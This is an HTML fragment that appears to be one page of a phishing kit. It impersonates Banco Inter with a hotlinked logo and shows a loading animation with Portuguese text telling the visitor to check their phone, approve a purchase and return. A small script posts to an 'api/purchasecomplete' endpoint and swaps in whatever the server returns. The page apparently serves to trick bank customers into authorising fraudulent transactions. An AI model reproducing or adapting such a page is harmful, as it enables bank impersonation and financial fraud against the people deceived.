<style>
    /* -----------------------------------------
  =Default css to make the demo more pretty
-------------------------------------------- */

    body {
        margin: 0 auto;
        padding: 20px;
        max-width: 1200px;
        overflow-y: scroll;
        font-family: 'Open Sans', sans-serif;
        font-weight: 400;
        color: #777;
        background-color: #f7f7f7;
        -webkit-font-smoothing: antialiased;
        -webkit-text-size-adjust: 100%;
        -ms-text-size-adjust: 100%;
    }

    .line {
        display: inline-block;
        width: 15px;
        height: 15px;
        border-radius: 15px;
        background-color: #FF8700;
    }

    .load-3 .line:nth-last-child(1) {
        animation: loadingC .6s .1s linear infinite;
    }

    .load-3 .line:nth-last-child(2) {
        animation: loadingC .6s .2s linear infinite;
    }

    .load-3 .line:nth-last-child(3) {
        animation: loadingC .6s .3s linear infinite;
    }

    .l-3 {
        animation-delay: .72s;
    }

    @keyframes loadingC {
        0% {
            transform: translate(0, 0);
        }

        50% {
            transform: translate(0, 15px);
        }

        100% {
            transform: translate(0, 0);
        }
    }
</style>
<br>
<h4><img class="center" src="https://upload.wikimedia.org/wikipedia/commons/0/0a/Logo-banco-inter-degrade.png" alt="Logo Banco Inter"></h4>
<br>
<center>
    <p class="flow-text">VERIFIQUE SEU CELULAR!</p>
</center>
<div class="row">
    <center>
        <div class="container">
            <div class="load-3" onclick="complete()">
                <div class="line"></div>
                <div class="line"></div>
                <div class="line"></div>
            </div>
        </div>
        <br>
        <p class="flow-text">APROVE A COMPRA E VOLTE AQUI PARA CONFERIR O RESULTADO.</p>
    </center>
</div>
<script>
    function complete(){
        $.post( "api/purchasecomplete").done(function( data ) {
            $("#conteudo").html(data);
        });
    }
</script>